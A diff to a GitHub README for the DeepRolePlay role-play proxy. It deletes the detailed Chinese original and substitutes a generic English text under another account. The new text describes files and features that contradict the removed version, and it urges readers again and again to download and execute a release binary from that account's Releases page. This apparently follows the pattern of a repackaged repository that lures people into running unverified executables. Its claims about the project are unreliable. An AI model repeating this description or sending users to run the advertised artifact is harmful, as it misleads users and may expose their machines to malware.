@@ -1,286 +1,427 @@
-# DeepRolePlay: 基于多智能体架构的深度角色扮演系统
-
-[English](README_en.md) | 中文
-
-## 项目概述
-
-DeepRolePlay 是一个突破性的多智能体角色扮演系统，通过 Agent 协作机制彻底解决传统大语言模型的角色遗忘问题。
-
-DeepRolePlay 采用多智能体分工架构：**记忆闪回智能体** + **情景更新智能体** + **主对话模型**，让 AI 告别角色遗忘，实现真正连贯的角色扮演。
-
-## 🚀 解决角色扮演核心痛点
-
-<img src="pics/generate.png" alt="DeepRolePlay演示" width="200">
-
-### 😤 你是否遇到过这些问题？
-- 🤖 **AI 突然忘记角色设定**：明明是法师却拿起了剑
-- 📖 **剧情前后不一致**：昨天的重要情节今天完全不记得
-- 💸 **Token 消耗巨大**：长对话费用飞涨，体验中断
-
-### ✅ DeepRolePlay 的解决方案
-- 🧠 **永不遗忘**：Agent 自动维护角色记忆，设定永久保持
-- 🔄 **剧情连贯**：智能情景更新，千万轮对话依然逻辑清晰  
-- 💰 **成本可控**：情景压缩技术，长对话费用降低 80%
-- 📚 **智能联网**：集成 Wikipedia 百科，自动补全角色背景和故事设定
-- 🗂️ **结构化管理**：JSON表格系统管理世界观、角色、道具等信息，支持动态增删改查
-- ⚡ **即插即用**：5分钟集成，SillyTavern 等平台直接使用
-- 🚀 **超高速响应**：采用 Gemini 2.5 Flash 智能代理，Fast模式下仅需2次AI调用，比正常回复多 10 秒
-
-## 🎯 如何使用
-
-### 💾 快速上手 - 下载即用版本
-
-1. **📦 解压软件包**
-   - 下载发布的软件包并解压到**非中文路径**下
-   - 解压后文件夹包含：`config.yaml` 配置文件 + `DeepRolePlay.exe` 主程序
-
-2. **⚙️ 修改配置文件**
-   
-   编辑 `config.yaml` 文件，**强烈推荐智能代理使用 Qwen3-235B（Fast模式下仅需2次AI调用，响应仅比正常多10秒）**：
-
-   配置文件已包含详细的初学者指南，主要需要修改以下配置：
-
-   ```yaml
-   # API代理配置 - 转发目标（你的主要聊天LLM）
-   proxy:
-     target_url: "https://api.your-provider.com/v1"    # 修改为你的API地址
-     api_key: "Your-Main-LLM-API-key"                  # 修改为你的API密钥
-   
-   # Agent配置 - 后台智能体（推荐Qwen3-235B）
-   agent:
-     model: "qwen/qwen3-235b-a22b-2507"                # 推荐模型
-     base_url: "https://openrouter.ai/api/v1"          # OpenRouter地址
-     api_key: "Your-OpenRouter-API-Key"                # 修改为你的OpenRouter密钥
-   ```
-
-3. **🚀 启动程序**
-   - 双击 `DeepRolePlay.exe` 启动
-   - 看到终端里项目正常运行即可
-   - 🌟本项目会检查端口是否被占用。如果被占用会自动+1.所以最终真正的端口需要用户检查终端输出
-
-4. **🔗 配置角色扮演前端**
-   - 在 SillyTavern、OpenWebUI 等平台中
-   - 将 `base_url` 改为：`http://localhost:6666/v1`
-   - **重要**：关闭历史记录限制，务必发送全部历史记录给代理！（不用担心token爆炸，max_history_length会控制）
-
-5. **🎭 开始角色扮演**
-   - 立即享受无遗忘的角色扮演体验！
-   - **更换角色时**：输入"deeproleplay"并发送可清除历史缓存，重新开始
-
-## 🎛️ 后台控制台功能
-
-DeepRolePlay 内置了强大的后台管理控制台，可通过聊天界面直接管理系统状态和数据。
-
-### 📋 控制台命令
-
-| 命令 | 功能 | 说明 |
-|------|------|------|
-| `$drp` | 进入后台模式 | 激活控制台管理功能 |
-| `$show` | 显示数据表格 | 查看当前所有内存表格（世界观、角色、道具等） |
-| `$rm` | 清空数据 | 重置所有内存表格和场景文件 |
-| `$exit` | 退出后台模式 | 返回正常角色扮演模式 |
-
-### 🔧 使用方法
-
-1. **进入控制台**：在任何聊天界面中发送 `$drp`
-   ```
-   用户: $drp
-   系统: Welcome to DeepRolePlay backend mode! Available commands:
-         - $rm: Clear all memory tables and scenarios
-         - $show: Display current memory tables  
-         - $exit: Exit backend mode
-   ```
-
-2. **查看数据表格**：发送 `$show` 查看当前存储的所有角色信息
-   ```
-   用户: $show
-   系统: Current Memory Tables:
-         
-         [世界观表] (2 rows)
-         [角色表] (1 rows)
-         [道具表] (0 rows)
-         ...
-   ```
-
-3. **清空角色数据**：发送 `$rm` 完全重置角色扮演状态
-   ```
-   用户: $rm
-   系统: Memory tables and scenarios directory have been reset successfully.
-   ```
-
-4. **退出控制台**：发送 `$exit` 返回正常聊天模式
-   ```
-   用户: $exit
-   系统: Exited backend mode successfully.
-   ```
-
-### 🎯 实用场景
-
-- **🔄 角色切换**：使用 `$rm` 快速清除上一个角色的所有设定
-- **📊 数据管理**：使用 `$show` 检查角色记忆是否正确保存
-- **🐛 故障排除**：当角色行为异常时，用 `$show` 查看内存状态
-- **🧪 测试调试**：开发过程中快速重置环境状态
-
-### 🔧 兼容性说明
-- ✅ **完全兼容 OpenAI API 格式**：所有支持 OpenAI 的工具都能直接使用
-- ✅ **支持主流模型**：Gemini、DeepSeek、Claude、本地 Ollama 等
-- ✅ **双重配置**：Agent 和转发目标可使用不同模型，成本优化灵活
-
-## Agent 工作原理
-
-传统单一模型的问题：**角色遗忘** → **剧情断裂** → **体验崩坏**
-
-DeepRolePlay 的 Agent 解决方案：
-- 🔍 **记忆闪回智能体**：智能检索历史对话和外部知识
-- 📝 **情景更新智能体**：实时维护角色状态和剧情连贯性，支持表格化数据管理
-- 🗂️ **表格管理系统**：结构化存储世界观、角色、道具等信息，支持动态增删改查
-- 🎭 **主对话模型**：基于完整上下文生成角色回应
-
-## 工作流程
-
-```
-         用户请求 -> HTTP代理服务
-                      |
-                      v
-            [检查是否为控制台命令]
-                /              \
-            是 /                \ 否
-              v                  v
-     后台控制台处理          触发工作流执行
-         |                        |
-    命令解析                +------+------+
-   ($drp/$show/               |             |
-    $rm/$exit)                v             v
-         |                记忆闪回      情景更新
-    执行相应操作              智能体        智能体
-    - 显示表格                |             |
-    - 重置数据                |        表格管理
-    - 模式切换                |        (增删改查)
-         |                    |             |
-         v                    +------+------+
-    返回命令结果                       |
-                                      v
-                               注入更新的情景
-                                      |
-                                      v
-                               转发至目标LLM
-                                      |
-                                      v
-                               返回增强响应
-```
-
-## 开发者帮助
-
-### 环境要求
-
-- Python 3.12
-- UV 虚拟环境管理器（推荐）
-
-### 1. 安装项目
-
-```bash
-git clone https://github.com/yourusername/deepRolePlay.git
-cd deepRolePlay
-uv venv --python 3.12
-uv pip install -r requirements.txt
-```
-
-### 2. 配置服务
-
-编辑 `config/config.yaml` 文件，**推荐使用 Qwen3-235B（Fast模式下仅需2次AI调用，仅比正常多10秒）**：
-
-```yaml
-# API代理配置 - 转发目标
-proxy:
-  target_url: "https://api.deepseek.com/v1"        # 你要转发的API地址
-  timeout: 30                                       # 请求超时时间（秒）
-  debug_mode: false                                 # 调试模式开关
-
-# 情景管理
-scenario:
-  file_path: "./scenarios/scenario.json"           # 情景文件路径（支持JSON表格格式）
-
-# 工作流控制配置
-langgraph:
-  max_history_length: 7                            # 传递给转发目标LLM的历史消息数量，控制context长度和token消耗
-  last_ai_messages_index: 1                       # 指定真实AI回复的索引(1=最后一个,2=倒数第二个)
-  only_forward: false                               # 快速模式开关
-  stream_workflow_to_frontend: false               # DRP工作流推送开关，默认不推送DRP内容到前端，如需推送请设置为true并在SillyTavern导入deeproleplay.json正则
-
-# 智能体配置 - Agent 使用的模型（推荐Qwen3-235B）
-agent:
-  model: "qwen/qwen3-235b-a22b-2507"               # 推荐使用 Qwen3-235B
-  base_url: "https://openrouter.ai/api/v1"         # API服务地址（推荐OpenRouter）
-  api_key: "your-api-key"                          # 填入你的 API Key
-  temperature: 0.1                                 # 生成温度（0-1）
-  max_tokens: 8192                                 # 最大输出token数
-  top_p: 0.9                                       # Top-p采样参数
-  debug: false                                     # 调试模式
-  max_iterations: 40                               # 最大处理轮次
-  timeout: 120                                     # 单次请求超时时间
-
-# 服务器配置
-server:
-  host: "0.0.0.0"
-  port: 6666
-  reload: false                                    # 热重载开关
-```
-
-### 3. 启动服务
-
-```bash
-uv run python main.py
-```
-
-### 4. 接入使用
-
-将你的 AI 应用（SillyTavern、OpenWebUI 等）的 API 端点改为：
-```
-http://localhost:6666/v1
-```
-
-
-> 🌟本项目会检查端口是否被占用。如果被占用会自动+1.所以最终真正的端口需要用户检查终端输出
-
-系统将自动：
-1. 拦截对话请求
-2. 执行智能体工作流
-3. 更新情景状态
-4. 将增强的上下文注入请求
-5. 返回更准确的角色扮演响应
-
-### 5. 打包发布
-
-使用 PyInstaller 打包为可执行文件：
-
-```bash
-pyinstaller --name DeepRolePlay --onefile --clean --console --add-data "src;src" --add-data "utils;utils" --add-data "config;config" main.py
-```
-
-打包后在 `dist/` 目录下会生成 `DeepRolePlay.exe`，连同配置文件一起发布给用户。
-
-## 支持的模型
-
-### 🔌 全面兼容 OpenAI 格式 API
-本项目采用标准 OpenAI API 格式，支持所有兼容的服务商：
-
-#### 智能体推荐模型
-- **🌟 Qwen3-235B**（强烈推荐）：仅增加20秒响应时间，角色扮演效果出色
-
-#### 转发目标模型
-- **💻 本地 Ollama**：完全私有化部署，数据安全
-- **🔥 DeepSeek**：高质量对话，成本低廉
-- **⚡ Claude**：逻辑清晰，推理能力强
-
-
-
-## 参考文献
-
-本项目的设计理念受到以下研究的启发：
-
-- [Building effective agents](https://www.anthropic.com/research/building-effective-agents) - Anthropic
-- [LangGraph Documentation](https://python.langchain.com/docs/langgraph) - LangChain
-
-## 许可证
-
-MIT License
+[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/Biralo-del/deepRolePlay/releases)
+
+# DeepRolePlay: A Multi-Agent RPG System Solving Character Forgetting
+
+DeepRolePlay is a groundbreaking multi-agent role-playing system that completely solves the character forgetting problem of traditional large language models through Agent collaboration mechanisms.
+
+🤖🧠✨ Welcome to the DeepRolePlay project. This README lays out the core idea, how to use the system, how to contribute, and what to expect from releases. The aim is to provide a practical, durable resource for developers, researchers, educators, and hobbyists who want to explore robust, memory-aware, cooperative AI agents in role-playing and narrative contexts.
+
+---
+
+## Table of Contents
+
+- Overview
+- Core Concepts
+- System Architecture
+- How DeepRolePlay Solves Forgetting
+- Getting Started
+  - Prerequisites
+  - Quick Start
+  - Running Locally
+- Release Artifacts and Downloads
+- Installation Details
+- Agent Collaboration Model
+- Environment and Story World
+- Roles, Characters, and Backstories
+- Tools and Plugins
+- Data Model and Prompts
+- API and Extensibility
+- Example Scenarios
+- Performance and Scalability
+- Testing and Quality Assurance
+- Security, Privacy, and Safety
+- Documentation and Tutorials
+- Community and Collaboration
+- Roadmap
+- Known Issues
+- FAQ
+- License and Attribution
+- Acknowledgments
+
+---
+
+## Overview
+
+DeepRolePlay provides a framework where multiple AI agents collaborate to play out a shared role-playing narrative. Each agent maintains its own memory, goals, and partial world model, but the system coordinates interactions to preserve coherence across turns, scenes, and longer-term story arcs. The key idea is to avoid forgetting by design: instead of a single model trying to remember everything, several agents specialize in different memory tasks, fact synthesis, world-state tracking, character progression, and narrative consistency. The collaboration mechanism ensures that important details remain accessible to the right agents at the right times.
+
+- The system is not tied to a single language model. It supports a plug-in architecture where you can mix and match multiple LLMs, tools, and memory backends.
+- It supports long-running sessions and episodic memory so you can run extended campaigns without losing context.
+- It provides a clean API for developers to build new roles, world rules, or narrative constraints.
+
+We designed DeepRolePlay to be useful in research, classroom settings, interactive fiction, game design, and simulated social experiments. The emphasis is on reliability, transparency, and ease of use, with a clear path from setup to running deep, collaborative narratives.
+
+---
+
+## Core Concepts
+
+- Agent: An autonomous unit with its own memory, goals, and decision logic. Agents communicate and coordinate to advance the story.
+- Memory: A structured memory layer that captures events, observations, character states, and world facts. Memories are searchable and referenceable by agents.
+- World Model: A shared representation of the narrative world, maintained through agent contributions.
+- Collaboration Protocol: A set of rules and messages that govern how agents request, share, resolve, and verify information.
+- Narrative Integrity: Mechanisms to maintain character voices, plot threads, and world consistency across scenes.
+- Role and Character: Entities with attributes, backstories, and goals that drive behavior within the story.
+- Tools and Plugins: Extensions that give agents access to external data, dynamic information, or specialized reasoning capabilities.
+- Epics and Episodes: Story structure that helps organize long campaigns into meaningful arcs.
+- Observations and Actions: The events agents notice and the actions they take to influence the story.
+
+---
+
+## System Architecture
+
+- Orchestrator: Coordinates agent interactions, enforces collaboration protocols, and maintains the global story timeline.
+- Agent Pool: A collection of agents, each with its own memory store, personality settings, and role-specific prompt templates.
+- Memory Stores: Local memories per agent and a shared, queryable memory for world facts and important history.
+- Prompt Library: A curated set of prompts for different agents, roles, and tasks to ensure consistent behavior.
+- World State Manager: Tracks scenes, locations, objects, NPCs, and plot threads.
+- Tool Layer: Optional integrations for external data sources, calculators, or domain-specific tools.
+- Logging and Audit: Transparent traces of decisions, messages, and memory updates for reproducibility.
+
+Visual sketch: A looping cycle of perception, memory update, collaboration, decision, and action, repeated across scenes and episodes.
+
+---
+
+## How DeepRolePlay Solves Forgetting
+
+- Distributed Memory: Each agent stores relevant pieces of memory locally, reducing the risk that a single model loses critical information.
+- Cross-Agent Memory Sharing: Important facts are summarized and shared across agents so no single memory gap derails the narrative.
+- Memory Fact Extraction: The system routinely extracts facts from conversations and events, indexing them for fast retrieval.
+- Consistency Constraints: Narrative constraints keep voice, character data, and plot threads aligned across turns.
+- Ephemeral and Persistent Memory: The system differentiates between transient scene details and persistent character arcs, ensuring coherence over long campaigns.
+- Conflict Resolution: When agents disagree on a fact, a structured resolution process reconciles differences using evidence, timestamps, and contextual checks.
+- Plan-Ahead and Backtracking: Agents plan steps ahead and can backtrack if contradictions emerge, preserving narrative integrity.
+- Replay and Audit: Full session replay allows investigators to inspect how memory and decisions evolved.
+
+---
+
+## Getting Started
+
+Prereqs and setup steps ensure you can run DeepRolePlay with minimal friction. This project leans on modern Python tooling and optional GPU-accelerated inference paths. You will learn to bootstrap an instance, load a world, create characters, and start a short narrative.
+
+Quick Start: you can begin with a minimal setup and a short story to test the collaboration workflow.
+
+- Ensure you have Python 3.10+ and a supported environment.
+- Install dependencies.
+- Run a starter script to initialize a small world with a handful of agents.
+- Interact with the scene and observe how agents coordinate.
+
+For hands-on instructions and the latest download, visit the Releases page. Download the appropriate release artifact and run the installer or unpack the archive as described. The Releases page is the best place to obtain tested, packaged builds. You can download the release artifact and execute it to run a ready-to-use environment.
+
+To download the release artifact, visit the Releases page:
+https://github.com/Biralo-del/deepRolePlay/releases
+
+What follows is a practical guide to getting your own instance up and running. It covers installation, configuration, and a simple test scenario to verify that agents collaborate correctly and memory is preserved across turns.
+
+---
+
+## Prerequisites
+
+- Operating System: Windows, macOS, or Linux with standard tooling.
+- Python: 3.10 or newer, with a virtual environment recommended.
+- Memory: A modest amount for light experiments; more memory helps with longer campaigns.
+- Network: Local access during development; external access if you want online tools.
+- Optional GPU: For faster inference with large models, a compatible CUDA-enabled GPU helps.
+
+---
+
+## Quick Start
+
+1) Clone or download the repository to your machine.
+
+2) Create a virtual environment and install dependencies:
+- python -m venv venv
+- source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
+- pip install -r requirements.txt
+
+3) Start a small world with two agents:
+- Run the init_world.py script or use the provided launcher to boot a tiny narrative.
+
+4) Interact with the system:
+- Use the command line or a minimal UI to send prompts and observe agent collaboration, memory updates, and story evolution.
+
+5) Observe memory and coherence:
+- The system logs show how agents preserve facts across exchanges and how they reconcile differences.
+
+6) Expand gradually:
+- Add a new character, scene, or tool to see how the collaboration protocol adapts.
+
+Note: The above steps are a practical guide. For exact commands, refer to the installation and run scripts in the repository. For the latest release, download the release artifact and execute it. The Releases page provides the packaged setup.
+
+---
+
+## Running Locally: Step-by-Step
+
+- Install dependencies
+- Prepare the environment
+- Launch the narrative orchestrator
+- Load an initial world and the characters
+- Enter the first scene
+- Monitor agent messages and memory state
+- Iterate on story arcs, scene transitions, and character development
+
+The local run demonstrates the partnership among agents: each agent reasons, speaks in character, and stores learned details in its memory. The orchestrator ensures that critical facts persist, and it uses cross-agent checks to avoid drift in the world model.
+
+---
+
+## Release Artifacts and Downloads
+
+The project uses a releases mechanism to provide ready-to-run artifacts. The link above points to the official releases page, where you can download a complete package that includes the runtime environment, example worlds, and starter prompts. The release artifact contains everything required to start a ready-made environment, including dependencies, configuration, and sample narratives. After download, execute the installer or unpack the archive according to the instructions included in the release notes.
+
+From the Releases page, you can download the appropriate artifact for your platform and run it. For convenience, the artifact is named with the version and platform, for example deepRolePlay-1.0.0-windows.exe or deepRolePlay-1.0.0-linux.tar.gz, depending on the build. The exact file name may change with each release, but the workflow remains consistent: download, run, and follow the on-screen prompts to configure the world, characters, and memory settings.
+
+If you need to verify a specific asset, the release notes provide checksums and verification steps. The versioned artifact ensures you have a stable baseline, which you can customize later if you wish to experiment with different agent configurations or memory backends.
+
+Releases also include sample worlds and test scenarios so you can quickly validate the collaboration mechanism. These scenarios illustrate how agents share facts, resolve disagreements, and maintain narrative coherence across scenes.
+
+Second mention of the link: For updated information about new releases and to obtain the latest artifact, check the Releases page at https://github.com/Biralo-del/deepRolePlay/releases. This ensures you are using a tested, packaged build.
+
+---
+
+## Installation Details
+
+- Source installation: Clone the repository and install dependencies.
+- Release-based installation: Download the release artifact that includes a pre-configured environment. Run the installer or extract the archive, then follow the on-screen setup prompts.
+- Optional tools: If you want enhanced performance, you can enable GPU acceleration and install optional tool packages.
+- Configuration: The system uses a set of configuration files for actors, world rules, and memory settings. You can adjust these to tailor the experience to your needs.
+- Persistence: Memory persists across sessions via a local store. You can switch to a remote memory backend if you want to share memory across machines.
+
+---
+
+## Agent Collaboration Model
+
+DeepRolePlay implements a robust collaboration model that keeps the narrative stable while allowing agents to exercise autonomy. Core pieces include:
+
+- Message Passing: Agents exchange concise messages that carry intent, facts, and requests for action.
+- Memory Sharing: Distilled memory fragments are shared to keep all agents aware of crucial world events.
+- Role-Specific Prompts: Each agent uses prompts tailored to its role and personality, ensuring varied yet coherent behavior.
+- Conflict Resolution: When two agents disagree on a fact, a structured process evaluates evidence, timestamps, and related context to resolve the discrepancy.
+- Action Planning: Agents propose action plans, which are evaluated and coordinated by the orchestrator before execution.
+- Story Steering: A designated steering agent can guide the narrative while respecting input from other agents to prevent bias.
+
+This collaboration yields stories where characters remember important details and react consistently across scenes, even as new information emerges.
+
+---
+
+## Environment and Story World
+
+- World State: Tracks places, NPCs, items, quests, and plot threads.
+- Scene Architecture: Scenes are modular units that drive character interactions.
+- Time and Chronology: The system maintains a plausible timeline to anchor events and ensure logical progression.
+- World Rules: A rule set governs what characters can and cannot do, how magic or tech works, and how conflicts resolve.
+- Narrative Tone: The system can adjust the style, from noir to light-hearted fantasy, while maintaining character voices.
+
+A rich world makes memory management essential. The stronger the world model, the less likely the story will drift.
+
+---
+
+## Roles, Characters, and Backstories
+
+- Role Design: Create tailored roles for agents with unique skills, goals, and viewpoints.
+- Character Voice: Each character has a distinctive voice that guides dialogue and decisions.
+- Backstory: Characters carry a backstory that informs motivations and reactions.
+- Growth Paths: Characters evolve through experiences, friendship bonds, and goals achieved.
+- Relationships Matrix: The world tracks relationships between characters, enabling complex social dynamics.
+- Mission Hooks: Short-term goals tie into long-running plots, giving agents clear incentives.
+
+The design encourages creative exploration while preventing drift in character behavior.
+
+---
+
+## Tools and Plugins
+
+- Data Tools: Access to external data sources for facts, weather, or inventories.
+- Calculation Tools: Complex calculations that support in-story decisions.
+- Image and Media Tools: Access to image libraries or audio clips to enhance scenes.
+- Semantic Search: Efficient retrieval of memory fragments and world facts.
+- Custom Plugins: Developers can add new plugins to extend capabilities, memory backends, or tools.
+
+Plugins are optional; they can be turned on or off depending on the use case.
+
+---
+
+## Data Model and Prompts
+
+- Memory Schema: Events, facts, observations, and character states with timestamps.
+- World Model: Entities, attributes, and relationships expressed in a structured way.
+- Prompts: Role-specific templates for agents, steering prompts, and tool prompts.
+- Memory Indexes: Efficient indices for fast retrieval during reasoning.
+- Evaluation Metrics: Quality checks for coherence, consistency, and narrative progression.
+
+Prompts are designed to be clear and concise to reduce ambiguity and support reliable memory usage.
+
+---
+
+## API and Extensibility
+
+- Public API: Interfaces for creating new worlds, adding characters, and controlling scenes.
+- Event Hooks: Extendable points to insert custom logic during perception, memory updates, and decision making.
+- Plugin Interface: A straightforward mechanism to add new tools or memory backends.
+- Data Import/Export: Import worlds from standard formats and export sessions for review.
+
+The API is designed to be approachable for developers and researchers while staying robust for production experiments.
+
+---
+
+## Example Scenarios
+
+- Fantasy City Adventure: A bustling city with guilds, factions, and a hidden conspiracy. Agents maintain city lore and character arcs across episodes.
+- Sci-Fi Research Station: A team of researchers navigates a mystery, balancing safety protocols, discoveries, and interpersonal tension.
+- Detective Noir: A gritty investigation where memories must be reconciled as clues surface and suspects lie.
+
+Each scenario demonstrates how memory and collaboration keep the story coherent as the plot unfolds.
+
+---
+
+## Performance and Scalability
+
+- Memory Footprint: Optimized storage to handle long campaigns with multiple agents.
+- Latency: Collaboration protocol minimizes delays between messages and world updates.
+- Throughput: The system scales with additional agents and larger worlds.
+- Resource Use: You can adjust the balance between memory detail and performance to fit hardware constraints.
+
+Performance tuning helps you run longer sessions with more agents without sacrificing coherence.
+
+---
+
+## Testing and Quality Assurance
+
+- Unit Tests: Validate memory operations, fact sharing, and conflict resolution.
+- Integration Tests: Ensure the orchestrator handles multiple agents reliably.
+- Scenario Tests: Run predefined stories to verify narrative coherence and agent alignment.
+- Reproducibility: Deterministic seeds and logging enable reproducible experiments.
+- Monitoring: Observability hooks provide insight into memory state, messages, and world changes.
+
+Tests help ensure stability as you extend the system with new roles or tools.
+
+---
+
+## Security, Privacy, and Safety
+
+- Access Control: Users and developers can control who can modify world state and memory.
+- Data Isolation: Agent memories are isolated to prevent leakage across sessions unless explicitly shared.
+- Safe Tooling: Tools and plugins are sandboxed to protect against unsafe actions.
+- Provenance: All decisions and memory updates are logged for auditability.
+- Content Moderation: The system supports policies to avoid harmful or inappropriate in-game outcomes.
+
+These measures help maintain a safe and predictable environment for all users.
+
+---
+
+## Documentation and Tutorials
+
+- Quick Start Tutorials: Step-by-step guides to set up a basic world and run a short campaign.
+- Developer Guides: How to extend the system with new roles, tools, and world rules.
+- API Reference: Detailed descriptions of public APIs, data models, and hooks.
+- Tutorials Gallery: A collection of use-case tutorials with code samples and expected outcomes.
+- Design Notes: Rationale for memory strategy, collaboration protocols, and narrative constraints.
+
+The tutorials are designed to help beginners and seasoned researchers alike.
+
+---
+
+## Community and Collaboration
+
+- Issues and Discussions: A place to report bugs, propose features, and discuss design choices.
+- Contribution Guidelines: How to contribute code, prompts, or world assets.
+- Code of Conduct: A welcoming environment for all contributors.
+- Community Projects: Examples and smaller projects built on top of DeepRolePlay.
+
+Collaboration accelerates progress and improves the system for everyone.
+
+---
+
+## Roadmap
+
+- Memory Optimizations: Reduce redundancy, improve retrieval speed, and lower memory usage.
+- Role Library: Expand the catalog of roles with diverse personalities and goals.
+- World Rules: Add modular rule packs for different genres and settings.
+- Cross-Session Persistence: Improve long-term continuity across multiple runs.
+- Visualization Tools: Dashboards showing memory graphs, world state, and narrative arcs.
+- Tutorials and Workshops: Live sessions to help new users adopt DeepRolePlay.
+
+Roadmap items help guide development and community contributions.
+
+---
+
+## Known Issues
+
+- Asset Availability: Some platforms may require minor adjustments to installer or dependencies.
+- Tool Compatibility: Some plugins may not work with all memory backends by default.
+- Language Coverage: Narrative voices may require tuning for less common dialects.
+- Large Worlds: Very large campaigns can stress memory. Plan memory budgets accordingly.
+
+Addressing known issues helps keep projects stable as you scale.
+
+---
+
+## FAQ
+
+- What is DeepRolePlay?
+  A multi-agent system for cooperative storytelling that preserves memory and coherence across scenes.
+
+- How do agents avoid forgetting?
+  Through distributed memory, cross-agent sharing, and a robust collaboration protocol.
+
+- Can I add my own characters?
+  Yes. You can define new roles, backstories, and goals and plug them into the world.
+
+- How do I get the latest features?
+  Download the latest release artifact from the Releases page and run it. The link above points to the official releases page, where you can download the artifact and execute it. For updated information about new releases, check the same page again.
+
+- Is there a tutorial?
+  Yes. The documentation and tutorials cover setup, world design, and running campaigns.
+
+---
+
+## License and Attribution
+
+- License: MIT License (or choose the appropriate license if you have a different one).
+- Attribution: Acknowledge contributors and the project when you reuse components or code.
+- Third-Party Dependencies: Respect licenses for any external libraries or tools used.
+
+--- 
+
+## Acknowledgments
+
+- Thanks to the contributors who helped design the collaboration protocols and memory architecture.
+- Thanks to the research community for inspiring ideas about memory and coordination in AI agents.
+- Thanks to early testers who provided valuable feedback on narrative coherence and tool integration.
+
+---
+
+## Visual Elements and Examples
+
+- Architecture Diagram: ![DeepRolePlay Architecture](https://raw.githubusercontent.com/Biralo-del/deepRolePlay/main/docs/architecture.png)
+- Role Cards: Visualized prompts for sample roles to help you design your own characters.
+- World Map: A schematic map showing scenes, routes, and key plot threads.
+- Memory Graph: A simplified view of how memory fragments connect across events.
+
+These visuals illustrate how the system behaves and how memory influences decisions.
+
+---
+
+## Additional Tips for Authors and Researchers
+
+- Start small: Build a tiny world with 2–3 agents to validate the collaboration protocol.
+- Version your worlds: As you add rules and characters, keep versions to compare narratives.
+- Experiment with memory backends: Try different memory storage options and measure coherence.
+- Document decisions: Keep notes on why agents chose certain actions to aid reproducibility.
+- Share artifacts: Publish world templates, character prompts, and example scenarios to grow the community.
+
+---
+
+## Next Steps
+
+- Add more example worlds and introspective prompts that help agents reflect on their own memory.
+- Improve the evaluation metrics to quantify narrative coherence and agent consistency.
+- Expand the tutorial library with end-to-end campaigns and debugging sessions.
+- Create a simple UI to monitor memory state and show agent discussions in real time.
+
+---
+
+## Final Note on Releases
+
+For access to ready-to-run artifacts, the official Releases page is your primary resource. The page provides packaged builds, sample worlds, and starter prompts, all designed to help you get up and running quickly. To obtain the latest release artifact and perform a local execution, please visit the Releases page at the link below. The release artifact is prepared to be downloaded and executed to launch your DeepRolePlay environment, enabling you to test your narratives without building from scratch.
+
+Releases page: https://github.com/Biralo-del/deepRolePlay/releases
+
+Continued exploration of the model’s collaboration and memory mechanisms will reveal how multiple agents achieve robust, long-form narratives without losing essential details. The design aims to combine clarity, reliability, and creativity in a way that serves researchers, builders, and storytellers alike.
